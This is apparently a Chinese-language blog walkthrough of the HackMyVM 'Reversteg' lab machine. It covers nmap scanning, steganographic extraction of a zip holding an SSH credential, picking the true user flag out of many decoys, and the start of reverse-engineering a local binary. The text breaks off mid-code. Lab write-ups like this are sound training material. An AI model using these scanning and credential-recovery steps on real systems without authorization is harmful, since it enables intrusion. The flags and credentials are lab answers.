{"pageProps":{"postData":{"id":"HackMyVMReversteg","contentHtml":"<h1>Reversteg.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Reversteg\">https://hackmyvm.eu/machines/machine.php?vm=Reversteg</a></p>\n</blockquote>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-css\">⚡ root<span class=\"hljs-keyword\">@kali</span>  ~  nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.94S</span>VN ( <span class=\"hljs-attribute\">https</span>://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">02</span>-<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">32</span> EST\nNmap <span class=\"hljs-attribute\">scan</span> report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.1</span>\nHost is up (<span class=\"hljs-number\">0.00029s</span> latency).\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">0</span><span class=\"hljs-attribute\">A</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">09</span> (Unknown)\nNmap <span class=\"hljs-attribute\">scan</span> report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.2</span>\nHost is up (<span class=\"hljs-number\">0.00028s</span> latency).\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:A9:<span class=\"hljs-number\">3</span><span class=\"hljs-attribute\">F</span>:FD (Oracle VirtualBox virtual NIC)\nNmap <span class=\"hljs-attribute\">scan</span> report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.104</span>\nHost is up (<span class=\"hljs-number\">0.00027s</span> latency).\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:C9:D2:EF (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-less\">⚡ <span class=\"hljs-selector-tag\">root</span>@<span class=\"hljs-selector-tag\">kali</span>  ~  <span class=\"hljs-selector-tag\">nmap</span> <span class=\"hljs-selector-tag\">-sT</span> <span class=\"hljs-selector-tag\">-min-rate</span> <span class=\"hljs-number\">10000</span> <span class=\"hljs-selector-tag\">-p-</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-selector-class\">.56</span><span class=\"hljs-selector-class\">.104</span>\n<span class=\"hljs-selector-tag\">Starting</span> <span class=\"hljs-selector-tag\">Nmap</span> <span class=\"hljs-number\">7.94S</span><span class=\"hljs-selector-tag\">VN</span> ( <span class=\"hljs-attribute\">https</span>:<span class=\"hljs-comment\">//nmap.org ) at 2025-02-22 03:32 EST</span>\nNmap scan report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.104</span>\nHost is up (<span class=\"hljs-number\">0.00093s</span> latency).\n<span class=\"hljs-keyword\">Not</span> <span class=\"hljs-attribute\">shown</span>: <span class=\"hljs-number\">65533</span> closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-attribute\">C9</span>:<span class=\"hljs-attribute\">D2</span>:EF (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-attribute\">done</span>: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">11.60</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-less\">⚡ <span class=\"hljs-selector-tag\">root</span>@<span class=\"hljs-selector-tag\">kali</span>  ~  <span class=\"hljs-selector-tag\">nmap</span> <span class=\"hljs-selector-tag\">-sT</span> <span class=\"hljs-selector-tag\">-A</span> <span class=\"hljs-selector-tag\">-T4</span> <span class=\"hljs-selector-tag\">-O</span> <span class=\"hljs-selector-tag\">-p</span> <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-selector-class\">.56</span><span class=\"hljs-selector-class\">.104</span>\n<span class=\"hljs-selector-tag\">Starting</span> <span class=\"hljs-selector-tag\">Nmap</span> <span class=\"hljs-number\">7.94S</span><span class=\"hljs-selector-tag\">VN</span> ( <span class=\"hljs-attribute\">https</span>:<span class=\"hljs-comment\">//nmap.org ) at 2025-02-22 03:33 EST</span>\nNmap scan report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.104</span>\nHost is up (<span class=\"hljs-number\">0.00061s</span> latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">7.9</span>p1 Debian <span class=\"hljs-number\">10</span>+deb10u4 (protocol <span class=\"hljs-number\">2.0</span>)\n| <span class=\"hljs-attribute\">ssh-hostkey</span>:\n|   <span class=\"hljs-number\">2048</span> <span class=\"hljs-attribute\">c2</span>:<span class=\"hljs-number\">91</span>:<span class=\"hljs-attribute\">d9</span>:<span class=\"hljs-attribute\">a5</span>:<span class=\"hljs-attribute\">f7</span>:<span class=\"hljs-attribute\">a3</span>:<span class=\"hljs-number\">98</span>:<span class=\"hljs-number\">1</span><span class=\"hljs-attribute\">f</span>:<span class=\"hljs-attribute\">c1</span>:<span class=\"hljs-number\">4</span><span class=\"hljs-attribute\">a</span>:<span class=\"hljs-number\">70</span>:<span class=\"hljs-number\">28</span>:<span class=\"hljs-attribute\">aa</span>:<span class=\"hljs-attribute\">ba</span>:<span class=\"hljs-attribute\">a4</span>:<span class=\"hljs-number\">10</span> (RSA)\n|   <span class=\"hljs-number\">256</span> <span class=\"hljs-number\">3</span><span class=\"hljs-attribute\">e</span>:<span class=\"hljs-number\">1</span><span class=\"hljs-attribute\">f</span>:<span class=\"hljs-attribute\">c9</span>:<span class=\"hljs-attribute\">eb</span>:<span class=\"hljs-attribute\">c0</span>:<span class=\"hljs-number\">6</span><span class=\"hljs-attribute\">f</span>:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">06</span>:<span class=\"hljs-attribute\">fc</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">5</span><span class=\"hljs-attribute\">f</span>:<span class=\"hljs-number\">2</span><span class=\"hljs-attribute\">f</span>:<span class=\"hljs-number\">1</span><span class=\"hljs-attribute\">b</span>:<span class=\"hljs-number\">35</span>:<span class=\"hljs-number\">33</span>:ec (ECDSA)\n|_  <span class=\"hljs-number\">256</span> <span class=\"hljs-attribute\">ec</span>:<span class=\"hljs-number\">64</span>:<span class=\"hljs-number\">87</span>:<span class=\"hljs-number\">04</span>:<span class=\"hljs-number\">9</span><span class=\"hljs-attribute\">a</span>:<span class=\"hljs-number\">4</span><span class=\"hljs-attribute\">b</span>:<span class=\"hljs-number\">32</span>:<span class=\"hljs-attribute\">fe</span>:<span class=\"hljs-number\">2</span><span class=\"hljs-attribute\">d</span>:<span class=\"hljs-number\">1</span><span class=\"hljs-attribute\">f</span>:<span class=\"hljs-number\">9</span><span class=\"hljs-attribute\">a</span>:<span class=\"hljs-attribute\">b0</span>:<span class=\"hljs-number\">81</span>:<span class=\"hljs-attribute\">d3</span>:<span class=\"hljs-number\">7</span><span class=\"hljs-attribute\">c</span>:cf (ED25519)\n<span class=\"hljs-number\">80</span>/tcp open  http    nginx <span class=\"hljs-number\">1.14</span>.<span class=\"hljs-number\">2</span>\n|<span class=\"hljs-attribute\">_http-server-header</span>: nginx/<span class=\"hljs-number\">1.14</span>.<span class=\"hljs-number\">2</span>\n|<span class=\"hljs-attribute\">_http-title</span>: Apache2 Ubuntu Default <span class=\"hljs-attribute\">Page</span>: It works\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-attribute\">C9</span>:<span class=\"hljs-attribute\">D2</span>:EF (Oracle VirtualBox virtual NIC)\n<span class=\"hljs-attribute\">Warning</span>: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice <span class=\"hljs-attribute\">type</span>: general purpose\n<span class=\"hljs-attribute\">Running</span>: Linux <span class=\"hljs-number\">4</span>.X|<span class=\"hljs-number\">5</span>.X\nOS <span class=\"hljs-attribute\">CPE</span>: <span class=\"hljs-attribute\">cpe</span>:/<span class=\"hljs-attribute\">o</span>:<span class=\"hljs-attribute\">linux</span>:<span class=\"hljs-attribute\">linux_kernel</span>:<span class=\"hljs-number\">4</span> <span class=\"hljs-attribute\">cpe</span>:/<span class=\"hljs-attribute\">o</span>:<span class=\"hljs-attribute\">linux</span>:<span class=\"hljs-attribute\">linux_kernel</span>:<span class=\"hljs-number\">5</span>\nOS <span class=\"hljs-attribute\">details</span>: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span>\nNetwork <span class=\"hljs-attribute\">Distance</span>: <span class=\"hljs-number\">1</span> hop\nService <span class=\"hljs-attribute\">Info</span>: <span class=\"hljs-attribute\">OS</span>: Linux; <span class=\"hljs-attribute\">CPE</span>: <span class=\"hljs-attribute\">cpe</span>:/<span class=\"hljs-attribute\">o</span>:<span class=\"hljs-attribute\">linux</span>:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">0.61</span> ms <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.104</span>\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report any incorrect results at <span class=\"hljs-attribute\">https</span>:<span class=\"hljs-comment\">//nmap.org/submit/ .</span>\nNmap <span class=\"hljs-attribute\">done</span>: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">15.09</span> seconds\n</code></pre>\n<p>访问<code>HTTP</code>，查看源码发现</p>\n<pre><code class=\"hljs language-jsx\"> 117db0148dc179a2c2245c5a30e63ab0 \n</code></pre>\n<pre><code class=\"hljs language-jsx\"> <span class=\"hljs-title class_\">Some</span> people always don<span class=\"hljs-string\">'t understand the format of photos. \n</span></code></pre>\n<p><img src=\"/post-images/HackMyVMReversteg/image126.png\" alt=\"image.png\"></p>\n<h2>图片隐写</h2>\n<p>根据提示可以找到两张图片</p>\n<p><img src=\"/post-images/HackMyVMReversteg/image127.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackMyVMReversteg/image128.png\" alt=\"image.png\"></p>\n<p>使用<code>winhex</code>打开<code>jpg</code>图片</p>\n<p><img src=\"/post-images/HackMyVMReversteg/image129.png\" alt=\"image.png\"></p>\n<p><code>TGlmZSBpcyBmdWxsIG9mIHNjZW5lcnksIGxvb2sgY2FyZWZ1bGx5</code> =  <code>Life is full of scenery, look carefully</code></p>\n<p>让我们仔细点，使用图片隐写工具来查找</p>\n<p><code>zsteg</code> 能找到一些字符串</p>\n<pre><code class=\"hljs language-swift\"> root<span class=\"hljs-meta\">@kali</span>  <span class=\"hljs-operator\">~/</span><span class=\"hljs-type\">Desktop</span><span class=\"hljs-regexp\">/test/</span>reverseteg  zsteg 117db0148dc179a2c2245c5a30e63ab0.png\nimagedata           <span class=\"hljs-operator\">..</span> text:<span class=\"hljs-string\">\"<span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\n</span>\"</span>\nb1,rgb,lsb,xy       <span class=\"hljs-operator\">..</span> text:<span class=\"hljs-string\">\"morainelake\"</span>\nb1,bgr,msb,xy       <span class=\"hljs-operator\">..</span>file: <span class=\"hljs-type\">OpenPGP</span> <span class=\"hljs-type\">Public</span> <span class=\"hljs-type\">Key</span>\nb2,r,lsb,xy         <span class=\"hljs-operator\">..</span> text:<span class=\"hljs-string\">\"UUUUUUUU@\"</span>\nb2,g,lsb,xy         <span class=\"hljs-operator\">..</span> text:<span class=\"hljs-string\">\"E@UAUUUUUUUUj\"</span>\nb2,g,msb,xy         <span class=\"hljs-operator\">..</span> text:<span class=\"hljs-string\">\"UUUZs-VUU\"</span>\nb2,b,lsb,xy         <span class=\"hljs-operator\">..</span> text:<span class=\"hljs-string\">\"EUUUUUUUUV\"</span>\nb2,b,msb,xy         <span class=\"hljs-operator\">..</span> text:<span class=\"hljs-string\">\"_UUUoUUe\"</span>\nb3,b,msb,xy         <span class=\"hljs-operator\">..</span>file: <span class=\"hljs-type\">MPEG</span> <span class=\"hljs-type\">ADTS</span>, layer <span class=\"hljs-type\">I</span>, v2,  <span class=\"hljs-number\">96</span> kbps, <span class=\"hljs-type\">Stereo</span>\nb3,rgb,lsb,xy       <span class=\"hljs-operator\">..</span>file: <span class=\"hljs-type\">PGP</span> <span class=\"hljs-type\">Secret</span> <span class=\"hljs-type\">Sub</span><span class=\"hljs-operator\">-</span>key <span class=\"hljs-operator\">-</span>\nb4,r,lsb,xy         <span class=\"hljs-operator\">..</span> text:<span class=\"hljs-string\">\"DEUTfgww\"</span>\nb4,r,msb,xy         <span class=\"hljs-operator\">..</span> text:<span class=\"hljs-string\">\"M,<span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span>\"</span>\nb4,g,lsb,xy         <span class=\"hljs-operator\">..</span> text: [<span class=\"hljs-string\">\"<span class=\"hljs-subst\">\\\"</span>\"</span> repeated <span class=\"hljs-number\">10</span> times]\nb4,g,msb,xy         <span class=\"hljs-operator\">..</span> text:<span class=\"hljs-string\">\"HDDDDDDDDDDH\"</span>\nb4,b,lsb,xy         <span class=\"hljs-operator\">..</span> text:<span class=\"hljs-string\">\"3<span class=\"hljs-subst\">\\\"</span>##2<span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span>#33333333333333334DDDDDDDDDD4C333<span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span>\"</span>\nb4,b,msb,xy         <span class=\"hljs-operator\">..</span> text:<span class=\"hljs-string\">\",<span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\\"</span>,\"</span>\n</code></pre>\n<p><code>morainelake</code> = 冰碛湖 （挠头）</p>\n<p>使用<code>steghide</code> ，密码使用的是上面的<code>morainelake</code></p>\n<pre><code class=\"hljs language-jsx\">⚡ root@kali  ~<span class=\"hljs-regexp\">/Desktop/</span>test/reverseteg  steghide extract -sf 117db0148dc179a2c2245c5a30e63ab0.<span class=\"hljs-property\">png</span>\n<span class=\"hljs-title class_\">Enter</span> <span class=\"hljs-attr\">passphrase</span>: \n<span class=\"hljs-attr\">steghide</span>: the file format <span class=\"hljs-keyword\">of</span> the file <span class=\"hljs-string\">\"117db0148dc179a2c2245c5a30e63ab0.png\"</span> is not supported.\n</code></pre>\n<pre><code class=\"hljs language-kotlin\">⚡ <span class=\"hljs-symbol\">root@</span>kali  ~/Desktop/test/reverseteg  steghide extract -sf 117db0148dc179a2c2245c5a30e63ab0.jpg --passphrase morainelake\nwrote extracted <span class=\"hljs-keyword\">data</span> to <span class=\"hljs-string\">\"secret.zip\"</span>.\n</code></pre>\n<p>找到压缩包<code>secret.zip</code> ，解压需要密码，再使用上面的<code>morainelake</code> 试试</p>\n<pre><code class=\"hljs language-jsx\"> root@kali  ~<span class=\"hljs-regexp\">/Desktop/</span>test/reverseteg  unzip secret.<span class=\"hljs-property\">zip</span> \n<span class=\"hljs-title class_\">Archive</span>:  secret.<span class=\"hljs-property\">zip</span>\n   <span class=\"hljs-attr\">creating</span>: secret/\n[secret.<span class=\"hljs-property\">zip</span>] secret/secret.<span class=\"hljs-property\">txt</span> <span class=\"hljs-attr\">password</span>: \n <span class=\"hljs-attr\">extracting</span>: secret/secret.<span class=\"hljs-property\">txt</span>       \n</code></pre>\n<p>成功解压，<code>secret.txt</code> 得到一组账户密码</p>\n<pre><code class=\"hljs language-jsx\">⚡ root@kali  ~<span class=\"hljs-regexp\">/Desktop/</span>test/reverseteg/secret  cat secret.<span class=\"hljs-property\">txt</span> \n<span class=\"hljs-attr\">morainelake</span>:<span class=\"hljs-number\">660930334</span>\n</code></pre>\n<p>登录<code>SSH</code>，成功</p>\n<pre><code class=\"hljs language-jsx\">⚡ root@kali  ~<span class=\"hljs-regexp\">/Desktop/</span>test/reverseteg/secret  ssh morainelake@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.104</span>                                                    \n<span class=\"hljs-title class_\">Welcome</span> to the target machine, enjoy the target machine, hope you have fun\nmorainelake@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.104</span><span class=\"hljs-string\">'s password: \nLinux reversteg 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Wed Feb 12 12:30:24 2025 from 192.168.56.110\n$ \n</span></code></pre>\n<h2>寻找UserFlag</h2>\n<p>当前目录下发现<code>note.txt</code> ，告诉我们<code>flag</code>在<code>history</code>里</p>\n<pre><code class=\"hljs language-jsx\">$ cat note.<span class=\"hljs-property\">txt</span>\nmorainelake is a very careless user <span class=\"hljs-keyword\">with</span> a very bad memory. <span class=\"hljs-title class_\">He</span> always throws things aside after organizing them. <span class=\"hljs-title class_\">This</span> time he accidentally lost the flag. <span class=\"hljs-title class_\">Fortunately</span>, the administrator has the historical records, but there are too many records to find the corresponding correct flag. <span class=\"hljs-title class_\">Can</span> you find it correctly?\n<span class=\"hljs-string\">\"Don't worry about failures; worry about the chances you miss when you don't even try. After all, it's better to look back and say, 'I can't believe I did that,' than to look back and say, 'What if?' (You'll probably fail anyway.)\"</span>\n</code></pre>\n<p>查看当前目录下<code>history</code></p>\n<pre><code class=\"hljs language-jsx\">$ cat history                         \nflag{f2c37e838de7a392ad0a06706b8e085d}                                                                            \nflag{7169dfc0baa126134898cbad82fa05c8}                                                                            \nflag{b6d165811d79ef969b6dba02b17e7515}\nflag{80c76fd7421fa86432cd149041237c93}                                                                            \nflag{bd6d2c2d3341f62146e52131e6054d6c}                                                                            \nflag{126a3c910cd193215df77fd15e12bc19}\nflag{29cb75657792d831fe49824c8469681c}                                                                            \nflag{c52104fb9a88eb1d2fa98089da436b2d}                                                                                                                                                                                              \nflag{c162c18399757600494cf451d1731f4e}\nflag{ca5dc62a5a5accd9acef8443c7c05d5b}        \nflag{cd65a0e12d20a418db4fa25830e198d6}                                                                            \nflag{4a62f46821c547ebfe8b3cfb68b4460b}                                                                            \nflag{276ad96e3911334974f7123e74542547}\nflag{d1318e29564a2bca8c0cd252773ed50f}\nflag{9d7efaeda0426e81a620a590062c0253}   \nflag{b6572d3e495f9e20bd48f4dfab698afa}\nflag{5e48556cd3ab1bb8ecada1c48c09683e}        \nflag{d7557776d621dc1fa37a5dd5e28eebf1}                                                                            \nflag{e4ee2346a545efa9ec71d0809506bbe3}                   \nflag{69cdc413a202c8b975b1f5d58c0abc31}               \nflag{e42177ea9bd9af02cbee28714c0bf810}\nflag{ad585a40ef71b01eab289301972ea73c}                                                                            \nflag{de85d1b5dae17c1b2df795057aea9d63}\nflag{29ee552a0fc65424f06ff0e9ebf3f702}                                                                                                                                                                                              \nflag{61c12af13786456ab6f43039b66b9520}                                                                            \nflag{3f54da44fd4015ead6ca7a45d44119a0} \nflag{7763434b99aa5fe05b57a715df13ac0f}                                                                            \nflag{67a3242f410382ae0aad70cf70c39fc1}                   \nflag{609a3fde1d0ff0478600003373ab9e1f}                                                                            \nflag{21a0414cd01ee07bdbdc35145d7fd692}                                                                            \nflag{4086a2e2d772bc9cc60619ac80b66e08}         \nflag{9b46b84c2efac472546d2ea15b827d2d}                   \nflag{ecdb0232a6f7253b9e62f47b0e0abde4}                                                                            \nflag{d65d4e8f4be0324bfc228262f9c3057f}\nflag{5683373ddd90fad10cb9cef94c22151f}                   \nflag{31d1f2a69718590fe0d9bd799c1f35d5}\nflag{5dd507404a37d5f2bcab199acab96359}     \nflag{7ac28659db3a7ab5264ad5332e26bc08}                                                                            \nflag{f3f8f735c14c017739e973afca6a0ab1}                                                                                                                                                                                              \nflag{68eb761ef934a9f1e4af3ac29bbdb7d7}                                                                            \nflag{263161187e89c4faf230e26c911e8654}                                                                                                                                                                                              \nflag{002afd16e27b0b44c47b8d63bc30abf6}                                                                            \nflag{636f5acb6eaeaae19e22d285f30f9b20}\nflag{bab9bf3305a412346ed4f5f6b02b395a}                                                                            \nflag{6877e8de891b0445b85405093f965b50}                                                                            \nflag{b7f67648519d1e5e02463ac712f0528d}\nflag{0860e3cff2ca853fac7961bdd9b8ec42}                                                                            \nflag{992e4183fe6dfc36addd95f2d4a06dfc}                                                                            \nflag{26fa3911daefda20f0f3ae0ba9b27dbf}\nflag{2b13920ee34622c50fd55d1360d42c0f}                                                                            \nflag{56b5abe9dc564d4edd05168698999c8e}                                                                                                                                                                                              \nflag{a7a9fa80ec47bdbe4be4c484c4522978}\nflag{b7d3ff8f7f5d49ddfc0c29cd9674f16d}        \nflag{1bcabdf36478c6fd83b5908dbcd4af1d}                                                                            \nflag{3ef11c54f23072dc43b7fa40bae7f70f}                                                                            \nflag{c0625cd0befb46fdcacb0e18db63ef34}\nflag{496d30e0ac86097e1bb3b9ee0107ca70}\nflag{c42ef3365ad87a27ffa5d3dbab874109}   \nflag{3ce203e761cc63f9a7c15ece415f007e}\nflag{dd7485615d0a6a566812072661ace5c5}        \nflag{698fa5d1182730a9604e08de81ff9cfe}                                                                            \nflag{5008836cd24994e6c72bb8686fbe5a8f}                   \nflag{81e27314d7583510226b13d80580f59e}               \nflag{d83f3546b77277dae3969108c75ad0cd}\nflag{62bd6854dca21e1d60f592dcf5b25de0}                                                                            \nflag{fc8941b9088096e99b635cc3e07080d6}\nflag{30999f5520de28d96b01b3d1853340b1}                                                                                                                                                                                              \nflag{014067f25f20519306013a2d31eac5b5}                                                                            \nflag{cb1e8b44c63c6de06f3cb20727062ba6} \nflag{629c11156aff51387dafccce728de96c}                                                                            \nflag{d69e5df2a026ffc85ff3f2ed43d61bef}                   \nflag{86ae64e63c5c9968363240521ae5164b}                                                                            \nflag{399b591e5007022b3e66e588db6f1fe3}                                                                            \nflag{9adf3951c5f3b93f673927f1d8901278}         \nflag{b9cc60e55d40258992c8e25aaa9bf089}                   \nflag{c230e3baf3539668e10212ef94d8291d}                                                                            \nflag{e9a0c405c5b7694d2740784343e1fef8}\nflag{231d326385eb50f0d4ab53f54c1dbc80}                \nflag{7a765f4fd76c305a2fe26dda4ea36e9d}\nflag{a4091483a5dcbb0c40b20b2c1c24bf47}     \nflag{ad17178bf859d19a81324d9d0c8c244a}                                                                            \nflag{5f420eb7da0e6f206089e6554cdae340}                                                                                                                                                                                              \nflag{9823f50f68ed769bc90b2cbd68b56b4c}                                                                            \nflag{d1d9e02392b4b72b0885db7490f619cd}                                                                                                                                                                                              \nflag{39c022930d47f7e761c8cb3efd16bbc8}                                                                            \nflag{add7fa68ef90faa3605f2285f64f2882}\nflag{6752c068769dc8f62356041f6d4304a6}                                                                            \nflag{52934e2768295b22329d429b0f24f601}                                                                            \nflag{4e1357260b5d9c39789f7f7a5946bb44}\nflag{74768d2a8bfad0807a23c5539805f39c}                                                                            \nflag{5bc1ecf9e7d083685d5287b0e79c74ee}                                                                            \nflag{377af1b4cc6eba82a7a55d4bb5403f56}\nflag{2cc92ef26991c388ff0887d3eb9fcce1}                                                                            \nflag{471c053dcc2db1c2aaf564bdad14db82}                                                                                                                                                                                              \nflag{4a8dab9ecd0d659ca9883a4be50c7c77}\nflag{95cadc47bc4d07b45ef91850a8e83f3f}        \nflag{9b0358eda57e0994c0c353f60274f66d}                                                                            \nflag{847e9105fb30ca4dd7ce1716b0aed40e}                                                                            \nflag{5a1e7d163a42e1361eb10db6fd11a0d9}\nflag{7fba1dd72baaa553e86f861d60f26a84}\nflag{1eecb7adc8bae78ad0cb33d8b4458df6}   \nflag{2c87d786b58ff9f4ba77972e09f36479}\nflag{275e8feb6e9df14c92a0c28bd82697db}        \nflag{7e5b56e54230db025c9e4f42fc5c76e3}                                                                            \nflag{a468c4a459a1dd6f30e8b07852de2bdd}                   \nflag{1865052c7cdebb8fd88da52a4140e921}               \nflag{4d66e030e6c35216bb2226dfcbca2921}\nflag{72fd280733d6d7d2527083581f90af2f}                                                                            \nflag{aaa940d0c621a241d00218ddf1f4a1aa}\nflag{5db9c2f2c3c0ef2881fe6dd6e4674f3b}                                                                                                                                                                                              \nflag{557a89952e95d11bc4a2a702da7b9a14}                                                                            \nflag{fedda55807704e79fcb60ddf8f7c3f31} \nflag{0501f784515d8263ed318d07686fe8eb}                                                                            \nflag{8cf613f987047536e87d517758d405ed}                   \nflag{2916e9b49e43bd17a0ffcbf386b7fdea}                                                                            \nflag{1dd25fe1d7bb2bf8ae2ec5a6e2cfd1b6}                                                                            \nflag{fb8a8b548592e0a106874ef24dbb1b48}         \nflag{b2f1e068a5bab886a3b9a36bbac373b4}                   \nflag{0da1df37e671df4d30fa3ea2547bd86a}                                                                            \nflag{703bd451303a69c4c697d8996c77126f}\n</code></pre>\n<p>…… 使用<code>wc</code>查看行数，会发现不一样</p>\n<pre><code class=\"hljs language-jsx\">$ cat history | wc -l\n<span class=\"hljs-number\">178</span>\n$ cat history | wc -l\n<span class=\"hljs-number\">19</span>\n$ cat history | wc -l\n<span class=\"hljs-number\">19</span>\n$ cat history | wc -l\n<span class=\"hljs-number\">19</span>\n</code></pre>\n<pre><code class=\"hljs language-jsx\">flag{37dc6d45426cf3e537ab074c230e13a8}\nflag{9f65be4cb0954563eb503822593b4dae}\nflag{4bd61aede95a77cb27d4b4f8fb768ada}\nflag{fc8941b9088096e99b635cc3e07080d6}\nflag{82857b70a6b1ceaa259060c08bc35f2c}\nflag{8a1e059553c1c818a2006bb775c80486}\nflag{c14c7a0e2b0aa3ea458a93a5d903a8d6}\nflag{ed70a45788f53f181cbfb04fe46ffff4}\nflag{143b944172b82222b44871b7efe46c57}\nflag{01d1db3ac8a512f7f1d601f18afc0ef5}\nflag{25f958709796bf7dfe83ec944005ae61}\nflag{d50cf51b391c603c36eccb3ba81f51a2}\nflag{81c51a4a8c08afdecc4e57dded278029}\nflag{dcb4b3f9d4c878d4cba3e635b00aca14}\nflag{e3007720e4ab09cd32921191f485eaf8}\nflag{b4fd276be5ca023a5b78eb98086418a9}\nflag{9fd7237c5d72677e5590b21218320122}\nflag{7039<span class=\"hljs-attr\">cat</span>: not found204f39c180cbd4}\n0lag{47ea4bd04049f8874838e9644f4a19b4}\n</code></pre>\n<p>将两次的结果作对比<code>flag{fc8941b9088096e99b635cc3e07080d6}</code> 是正确的<code>flag</code></p>\n<h2>Re</h2>\n<p>先信息收集一波</p>\n<p>在<code>/opt</code>文件夹下发现<code>reverse</code></p>\n<pre><code class=\"hljs language-jsx\">$ ls -al\ntotal <span class=\"hljs-number\">28</span>\ndrwxr-xr-x  <span class=\"hljs-number\">2</span> root root  <span class=\"hljs-number\">4096</span> <span class=\"hljs-title class_\">Feb</span> <span class=\"hljs-number\">20</span> <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">05</span> .\ndrwxr-xr-x <span class=\"hljs-number\">18</span> root root  <span class=\"hljs-number\">4096</span> <span class=\"hljs-title class_\">Jan</span>  <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">50</span> ..\n-rwxr-xr-x  <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">17088</span> <span class=\"hljs-title class_\">Feb</span> <span class=\"hljs-number\">12</span> <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">09</span> reverse\n$ ./reverse\n<span class=\"hljs-title class_\">Enter</span> passwords or <span class=\"hljs-title class_\">Enter</span> H coward <span class=\"hljs-attr\">mode</span>:\nq\nw\ne\nr\n[-] <span class=\"hljs-title class_\">Incorrect</span> password!\n</code></pre>\n<p>并且靶机标题也是与<code>reverse</code>有关，将<code>reverse</code>传出来</p>\n<p>放到<code>IDA</code>进行分析（核心代码）</p>\n<pre><code class=\"hljs language-jsx\">  <span class=\"hljs-title function_\">puts</span>(<span class=\"hljs-string\">\"Enter passwords or Enter H coward mode:\"</span>);\n  v20 = <span class=\"hljs-number\">0</span>;\n  <span class=\"hljs-keyword\">while</span> ( <span class=\"hljs-number\">1</span> )\n  {\n    <span 